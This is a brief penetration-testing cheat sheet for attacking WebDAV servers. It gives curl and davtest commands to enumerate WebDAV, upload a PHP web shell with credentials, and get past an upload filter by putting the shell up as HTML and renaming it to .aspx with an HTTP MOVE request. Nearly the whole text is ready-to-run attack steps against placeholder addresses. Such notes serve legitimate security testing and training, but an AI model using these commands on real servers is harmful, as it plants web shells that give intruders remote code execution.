## Webdav enumeration

davtest -url http://xx.xx.xx.xx

## Upload shell 

curl -vvv --upload-file cmd.php http://xxx.xxx.xxx.xxx/webdav/cmd.php --user username:password

## Upload shell as html and rename to bypass filter

```sh
curl -vvv -T '/home/nighter/shell.html' 'http://xxx.xxx.xxx.xxx/'
curl -v -X MOVE --header 'Destination:http://xxx.xxx.xxx.xxx/shell.aspx' 'http://xxx.xxx.xxx.xxx/shell.html'
```
